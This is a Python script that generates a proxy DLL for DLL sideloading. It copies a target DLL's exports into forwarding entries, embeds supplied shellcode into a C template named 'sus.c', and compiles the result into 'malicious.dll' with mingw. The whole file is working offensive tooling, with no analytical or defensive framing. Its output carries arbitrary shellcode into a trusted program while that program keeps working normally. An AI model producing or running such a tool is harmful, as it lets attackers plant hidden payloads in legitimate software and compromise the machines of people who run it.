import pefile
import argparse
import os
import subprocess

def create_def_file(dll_path):
    dll_basename = os.path.splitext(os.path.basename(dll_path))[0]

    try:
        dll = pefile.PE(dll_path)

        def_file_name = os.path.basename(dll_path).replace(".dll", ".def")
        dot_def = def_file_name
        
        with open(def_file_name, "w") as f:
            f.write("EXPORTS\n")
            for export in dll.DIRECTORY_ENTRY_EXPORT.symbols:
                if export.name:
                    f.write(f'{export.name.decode()}={dll_basename}.{export.name.decode()} @{export.ordinal}\n')

        print("Module Definition file created successfully.")
    except Exception as e:
        print(f"Module Definition file can't be created: {e}")
    
    return dot_def

def format_shellcode(shellcode):
    formatted_shellcode = ""
    bytes_per_line = 16
    for i in range(0, len(shellcode), bytes_per_line):
        line = shellcode[i:i + bytes_per_line]
        formatted_line = ''.join(f'\\x{b:02x}' for b in line)
        formatted_shellcode += f'"{formatted_line}"\n'
    return formatted_shellcode.strip()

def update_create_dll_c(shellcode_path, c_file_path='create_dll.c', output_path='sus.c'):
    try:
        with open(shellcode_path, 'rb') as shellcode_file:
            shellcode = shellcode_file.read()

        formatted_shellcode = format_shellcode(shellcode)

        with open(c_file_path, 'r') as c_file:
            c_code = c_file.read()

        new_c_code = c_code.replace('%p%', formatted_shellcode, 1)

        with open(output_path, 'w') as sus_file:
            sus_file.write(new_c_code)

        print(f"{output_path} file created successfully.")
    except Exception as e:
        print(f"Failed to create {output_path} file: {e}")

def compile_dll(dot_def):
    try:
        subprocess.run(["x86_64-w64-mingw32-gcc", "sus.c", "-o", "malicious.dll", "--shared", dot_def, "-s"])
        print("DLL compilation completed successfully.")
    except Exception as e:
        print(f"Failed to compile DLL: {e}")

def main():
    parser = argparse.ArgumentParser(description="DLL tool with .def file creation and create_dll.c shellcode update.")
    parser.add_argument("dll_path", help="Path to the DLL file.")
    parser.add_argument("-s", "--shellcode", help="Path to the shellcode file to update create_dll.c.")
    args = parser.parse_args()

    if not os.path.isfile(args.dll_path):
        print(f"The file {args.dll_path} does not exist.")
        return

    dot_def = create_def_file(args.dll_path)

    if args.shellcode:
        if not os.path.isfile(args.shellcode):
            print(f"The shellcode file {args.shellcode} does not exist.")
            return
        update_create_dll_c(args.shellcode)

    compile_dll(dot_def)

if __name__ == "__main__":
    main()
